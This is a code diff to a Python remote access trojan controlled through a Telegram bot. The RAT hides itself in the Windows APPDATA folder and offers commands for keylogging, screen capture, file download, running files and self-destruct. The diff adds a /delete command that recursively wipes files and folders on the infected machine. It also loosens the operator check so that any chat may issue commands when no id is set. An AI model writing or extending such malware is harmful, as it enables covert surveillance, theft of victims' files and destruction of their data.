@@ -18,12 +18,7 @@ token = os.environ['RAT_TOKEN'] # you can set your environment variable as well
 known_ids = []
 known_ids.append(os.environ['TELEGRAM_CHAT_ID']) # make sure to remove this line if you don't have this environment variable
 def checkchat_id(chat_id):
-	# COMMENT THE LINE below if you want this to work just for your telegram id!
-	#return True
-	try:
-		return str(chat_id) in known_ids
-	except:
-		return str(chat_id) == known_ids
+	return len(known_ids) == 0 or str(chat_id) in known_ids
 if (argv[0]).endswith('.exe'):
 	appdata_roaming_folder = os.environ['APPDATA']	# = 'C:\Users\Username\AppData\Roaming'
 	# HIDING OPTIONS
@@ -73,7 +68,7 @@ def handle(msg):
 	chat_id = msg['chat']['id']
 	print 'Got message from ' + str(chat_id) + ': ' + msg['text']
 	if checkchat_id(chat_id):
-		functionalities = ['/capture_pc', '/cd', '/download', '/ip_info', '/keylogs', '/ls', '/msg_box', '/pc_info', '/play', '/pwd', '/run_file', '/self_destruct', '/to'] # turn into dictionary?
+		functionalities = ['/capture_pc', '/cd', '/delete', '/download', '/ip_info', '/keylogs', '/ls', '/msg_box', '/pc_info', '/play', '/pwd', '/run_file', '/self_destruct', '/to'] # turn into dictionary?
 		if 'text' in msg:
 			command = msg['text']
 			response = ''
@@ -92,6 +87,22 @@ def handle(msg):
 					response = os.getcwd() + '>'
 				except:
 					response = 'No subfolder matching ' + command
+			elif command.startswith('/delete'):
+				command = command.replace('/delete', '')
+				path_file = command.strip()
+				try:
+					os.remove(path_file)
+					response = 'Succesfully removed file'
+				except:
+					try:
+						os.rmdir(path_file)
+						response = 'Succesfully removed folder'
+					except:
+						try:
+							shutil.rmtree(path_file)
+							response = 'Succesfully removed folder and it\'s files'
+						except:
+							response = 'File not found'
 			elif command.startswith('/download'):
 				bot.sendChatAction(chat_id, 'typing')
 				path_file = command.replace('/download', '')
@@ -132,7 +143,7 @@ def handle(msg):
 					response = '/msg_box yourText'
 				else:
 					ctypes.windll.user32.MessageBoxW(0, message, u'Information', 0x40)
-					response = 'MsgBox Displayed'
+					response = 'MsgBox displayed'
 			elif command == '/pc_info':
 				bot.sendChatAction(chat_id, 'typing')
 				info = ''
